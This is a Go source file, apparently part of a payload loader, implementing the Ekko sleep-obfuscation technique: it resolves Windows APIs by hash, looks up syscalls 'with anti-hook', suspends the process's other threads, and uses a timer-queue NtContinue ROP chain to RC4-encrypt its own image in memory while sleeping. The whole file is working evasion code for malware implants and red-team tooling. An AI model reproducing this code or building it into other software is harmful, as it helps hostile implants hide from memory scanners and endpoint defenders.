// taken from https://github.com/scriptchildie/goEkko and adapted to use my wincall infra, no syscall/windows imports :3 
package ekko

import (
	"time"
	"log"
	"unsafe"
	"crypto/rand"
	"loader/pkg/types"
	"github.com/carved4/go-wincall"
)

const (
	WT_EXECUTEINTIMERTHREAD         = 0x00000020
	ThreadQuerySetWin32StartAddress = 0x9
)

var (
	// kernel32 module base
	kernel32Base uintptr
	
	// kernel32 function addresses
	procSuspendThread         uintptr
	procResumeThread          uintptr
	procGetModuleHandleA      uintptr
	procCreateEventW          uintptr
	procCreateTimerQueue      uintptr
	procCreateTimerQueueTimer uintptr
	procRtlCaptureContext     uintptr
	procVirtualProtect        uintptr
	procWaitForSingleObject   uintptr
	procSetEvent              uintptr
	procDeleteTimerQueue      uintptr

	// ntdll syscall numbers and function addresses
	ntContinueSyscallNum               uint16
	ntContinueFuncAddr                 uintptr
	ntQueryInformationThreadSyscallNum uint16

	// Advapi32 module base and function addresses
	advapi32Base uintptr
	procSystemFunction032 uintptr
)

func init() {
	// Load kernel32.dll
	kernel32Base = wincall.LoadLibraryLdr("kernel32.dll")
	
	// Get kernel32 function addresses
	procSuspendThread = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("SuspendThread"))
	procResumeThread = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("ResumeThread"))
	procGetModuleHandleA = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("GetModuleHandleA"))
	procCreateEventW = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("CreateEventW"))
	procCreateTimerQueue = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("CreateTimerQueue"))
	procCreateTimerQueueTimer = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("CreateTimerQueueTimer"))
	procRtlCaptureContext = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("RtlCaptureContext"))
	procVirtualProtect = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("VirtualProtect"))
	procWaitForSingleObject = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("WaitForSingleObject"))
	procSetEvent = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("SetEvent"))
	procDeleteTimerQueue = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("DeleteTimerQueue"))

	// Get ntdll syscalls and function addresses
	var err error
	ntContinueSyscallNum, _, err = wincall.GetSyscallWithAntiHook("NtContinue")
	if err != nil {
		log.Fatalf("Failed to get NtContinue syscall: %v", err)
	}
	
	// Get traditional function address for ROP chain (safer than direct syscall)
	ntdllBase := wincall.GetModuleBase(wincall.GetHash("ntdll.dll"))
	ntContinueFuncAddr = wincall.GetFunctionAddress(ntdllBase, wincall.GetHash("NtContinue"))
	
	ntQueryInformationThreadSyscallNum, _, err = wincall.GetSyscallWithAntiHook("NtQueryInformationThread")
	if err != nil {
		log.Fatalf("Failed to get NtQueryInformationThread syscall: %v", err)
	}

	// Load Advapi32.dll
	advapi32Base = wincall.LoadLibraryLdr("Advapi32.dll")
	procSystemFunction032 = wincall.GetFunctionAddress(advapi32Base, wincall.GetHash("SystemFunction032"))
}

func EkkoSleep(sleepTime uint64) error {

	currentProcessID := wincall.CurrentThreadIDFast() // Use wincall function instead

	// Take a snapshot of all running threads in the system
	kernel32Base := wincall.LoadLibraryLdr("kernel32.dll")
	procCreateToolhelp32Snapshot := wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("CreateToolhelp32Snapshot"))
	procCloseHandle := wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("CloseHandle"))
	procThread32First := wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("Thread32First"))
	procThread32Next := wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("Thread32Next"))
	procOpenThread := wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("OpenThread"))
	procGetCurrentProcessId := wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("GetCurrentProcessId"))
	
	hThreadSnapshot, _, err := wincall.CallG0(procCreateToolhelp32Snapshot, 0x00000004, 0) // TH32CS_SNAPTHREAD = 0x00000004
	if err != nil {
		return err
	}
	defer wincall.CallG0(procCloseHandle, hThreadSnapshot)

	currentProcessIDResult, _, _ := wincall.CallG0(procGetCurrentProcessId)
	currentProcessID = uint32(currentProcessIDResult)

	var te32 types.ThreadEntry32
	te32.Size = uint32(unsafe.Sizeof(te32))

	// Retrieve information about the first thread in the snapshot
	ret, _, _ := wincall.CallG0(procThread32First, hThreadSnapshot, uintptr(unsafe.Pointer(&te32)))
	if ret == 0 {
		return nil
	}

	procGetCurrentThreadId := wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("GetCurrentThreadId"))

	for {
		if te32.OwnerProcessID == currentProcessID {

			currentThreadID, _, _ := wincall.CallG0(procGetCurrentThreadId)
			if uint32(currentThreadID) != te32.ThreadID {

				hThread, _, err := wincall.CallG0(procOpenThread, 0xFFFF, 0, uintptr(te32.ThreadID))
				if err != nil {
					continue
				}
				defer wincall.CallG0(procCloseHandle, hThread)
				var dwStartAddress, size uintptr
				wincall.Syscall(ntQueryInformationThreadSyscallNum, uintptr(hThread), ThreadQuerySetWin32StartAddress, uintptr(unsafe.Pointer(&dwStartAddress)), unsafe.Sizeof(dwStartAddress), uintptr(unsafe.Pointer(&size)))

				ImageBase, _, _ := wincall.CallG0(procGetModuleHandleA, 0)
				e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
				nt_header := (*types.IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))
				ImageEndAddress := ImageBase + uintptr(nt_header.OptionalHeader.SizeOfImage)

				if dwStartAddress >= ImageBase && dwStartAddress <= ImageEndAddress {
					wincall.CallG0(procSuspendThread, hThread)
				} else {
					goto nextThread
				}

			}
		}

		// Retrieve information about the next thread in the snapshot
	nextThread:
		ret, _, _ := wincall.CallG0(procThread32Next, hThreadSnapshot, uintptr(unsafe.Pointer(&te32)))
		if ret == 0 {
			break // No more threads
		}
	}

	te32.Size = uint32(unsafe.Sizeof(te32))
	ret, _, _ = wincall.CallG0(procThread32First, hThreadSnapshot, uintptr(unsafe.Pointer(&te32)))
	if ret == 0 {
		return nil
	}

	err = ekko(sleepTime)
	error2 := err

	// resume threads
	for {
		if te32.OwnerProcessID == currentProcessID {

			currentThreadID, _, _ := wincall.CallG0(procGetCurrentThreadId)
			if uint32(currentThreadID) != te32.ThreadID {

				hThread, _, err := wincall.CallG0(procOpenThread, 0xFFFF, 0, uintptr(te32.ThreadID))
				if err != nil {
					continue
				}
				defer wincall.CallG0(procCloseHandle, hThread)

				wincall.CallG0(procResumeThread, hThread)

			}
		}

		// Retrieve information about the next thread in the snapshot
		ret, _, _ := wincall.CallG0(procThread32Next, hThreadSnapshot, uintptr(unsafe.Pointer(&te32)))
		if ret == 0 {
			break // No more threads
		}
	}

	if error2 != nil {
		return error2
	}
	return nil
}

func ekko(sleepTime uint64) error {

	// Allocate CONTEXT structures with proper alignment (16-byte aligned)
	ctxSize := unsafe.Sizeof(types.CONTEXT{})
	alignedSize := (ctxSize + 15) &^ 15 // Round up to 16-byte boundary
	
	// Allocate memory for all CONTEXT structures in one block to ensure alignment
	contextMem := make([]byte, int(alignedSize)*7+15) // 7 contexts + padding
	contextBase := uintptr(unsafe.Pointer(&contextMem[0]))
	alignedBase := (contextBase + 15) &^ 15 // Align to 16-byte boundary
	
	CtxThread := (*types.CONTEXT)(unsafe.Pointer(alignedBase))
	RopProtRW := (*types.CONTEXT)(unsafe.Pointer(alignedBase + alignedSize))
	RopMemEnc := (*types.CONTEXT)(unsafe.Pointer(alignedBase + alignedSize*2))
	RopDelay := (*types.CONTEXT)(unsafe.Pointer(alignedBase + alignedSize*3))
	RopMemDec := (*types.CONTEXT)(unsafe.Pointer(alignedBase + alignedSize*4))
	RopProtRX := (*types.CONTEXT)(unsafe.Pointer(alignedBase + alignedSize*5))
	RopSetEvt := (*types.CONTEXT)(unsafe.Pointer(alignedBase + alignedSize*6))
	
	// Initialize all CONTEXT structures to zero
	for i := 0; i < 7; i++ {
		ctx := (*types.CONTEXT)(unsafe.Pointer(alignedBase + alignedSize*uintptr(i)))
		*ctx = types.CONTEXT{}
	}

	keybuf, _ := GenerateKey(16)

	var Key, Img types.UString

	ImageBase, _, _ := wincall.CallG0(procGetModuleHandleA, 0)
	e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
	nt_header := (*types.IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))

	hEvent, _, _ := wincall.CallG0(procCreateEventW, 0, 0, 0, 0)
	var hNewTimer, hTimerQueue uintptr
	hTimerQueue, _, _ = wincall.CallG0(procCreateTimerQueue)
	Img.Buffer = (*byte)(unsafe.Pointer(ImageBase))
	Img.Length = nt_header.OptionalHeader.SizeOfImage

	Key.Buffer = &keybuf[0]
	Key.Length = uint32(unsafe.Sizeof(Key))

	wincall.CallG0(procCreateTimerQueueTimer, uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procRtlCaptureContext, uintptr(unsafe.Pointer(CtxThread)), 0, 0, WT_EXECUTEINTIMERTHREAD)
	wincall.CallG0(procWaitForSingleObject, hEvent, 0x100)

	if CtxThread.Rip == 0 {
		log.Fatalln()
	}
	*RopProtRW = *CtxThread
	*RopMemEnc = *CtxThread
	*RopDelay = *CtxThread
	*RopMemDec = *CtxThread
	*RopProtRX = *CtxThread
	*RopSetEvt = *CtxThread

	var OldProtect uint64
	RopProtRW.Rsp -= 8
	RopProtRW.Rip = uint64(procVirtualProtect)
	RopProtRW.Rcx = uint64(ImageBase)
	RopProtRW.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
	RopProtRW.R8 = 0x04 // PAGE_READWRITE
	RopProtRW.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))

	RopMemEnc.Rsp -= 8
	RopMemEnc.Rip = uint64(procSystemFunction032)
	RopMemEnc.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
	RopMemEnc.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))

	// Get current process handle
	procGetCurrentProcess := wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("GetCurrentProcess"))
	currentProcess, _, _ := wincall.CallG0(procGetCurrentProcess)
	
	RopDelay.Rsp -= 8
	RopDelay.Rip = uint64(procWaitForSingleObject)
	RopDelay.Rcx = uint64(currentProcess)
	RopDelay.Rdx = sleepTime

	RopMemDec.Rsp -= 8
	RopMemDec.Rip = uint64(procSystemFunction032)
	RopMemDec.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
	RopMemDec.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))

	RopProtRX.Rsp -= 8
	RopProtRX.Rip = uint64(procVirtualProtect)
	RopProtRX.Rcx = uint64(ImageBase)
	RopProtRX.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
	RopProtRX.R8 = 0x40 // PAGE_EXECUTE_READWRITE
	RopProtRX.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))

	// SetEvent( hEvent );
	RopSetEvt.Rsp -= 8
	RopSetEvt.Rip = uint64(procSetEvent)
	RopSetEvt.Rcx = uint64(hEvent)

	// Create timer queue timers with NtContinue function address (traditional API call)
	ntContinueAddr := ntContinueFuncAddr

	wincall.CallG0(procCreateTimerQueueTimer, uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, ntContinueAddr, uintptr(unsafe.Pointer(RopProtRW)), 100, 0, WT_EXECUTEINTIMERTHREAD)
	wincall.CallG0(procCreateTimerQueueTimer, uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, ntContinueAddr, uintptr(unsafe.Pointer(RopMemEnc)), 200, 0, WT_EXECUTEINTIMERTHREAD)
	wincall.CallG0(procCreateTimerQueueTimer, uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, ntContinueAddr, uintptr(unsafe.Pointer(RopDelay)), 300, 0, WT_EXECUTEINTIMERTHREAD)
	wincall.CallG0(procCreateTimerQueueTimer, uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, ntContinueAddr, uintptr(unsafe.Pointer(RopMemDec)), 400, 0, WT_EXECUTEINTIMERTHREAD)
	wincall.CallG0(procCreateTimerQueueTimer, uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, ntContinueAddr, uintptr(unsafe.Pointer(RopProtRX)), 500, 0, WT_EXECUTEINTIMERTHREAD)
	wincall.CallG0(procCreateTimerQueueTimer, uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, ntContinueAddr, uintptr(unsafe.Pointer(RopSetEvt)), 600, 0, WT_EXECUTEINTIMERTHREAD)

	wincall.CallG0(procWaitForSingleObject, hEvent, 0xFFFFFFFF) // INFINITE = 0xFFFFFFFF
	wincall.CallG0(procDeleteTimerQueue, hTimerQueue)

	return nil
}

// EncryptMemoryRegion encrypts a memory region using SystemFunction032 (RC4)
// This is a standalone function that can be called independently
func EncryptMemoryRegion(baseAddr uintptr, size uint32, key []byte, sleepTime uint64) error {
	if len(key) == 0 {
		return nil
	}
	
	var dataUString, keyUString types.UString
	

	dataUString.Buffer = (*byte)(unsafe.Pointer(baseAddr))
	dataUString.Length = size
	dataUString.MaximumLength = size
	

	keyUString.Buffer = &key[0]
	keyUString.Length = uint32(len(key))
	keyUString.MaximumLength = uint32(len(key))

	wincall.CallG0(procSystemFunction032,
		uintptr(unsafe.Pointer(&dataUString)),
		uintptr(unsafe.Pointer(&keyUString)),
	)

	time.Sleep(time.Duration(sleepTime) * time.Millisecond)
	
	return nil
}

func GenerateKey(keySize int) ([]byte, error) {
	key := make([]byte, keySize)
	_, err := rand.Read(key)
	if err != nil {
		return nil, err
	}
	return key, nil
}
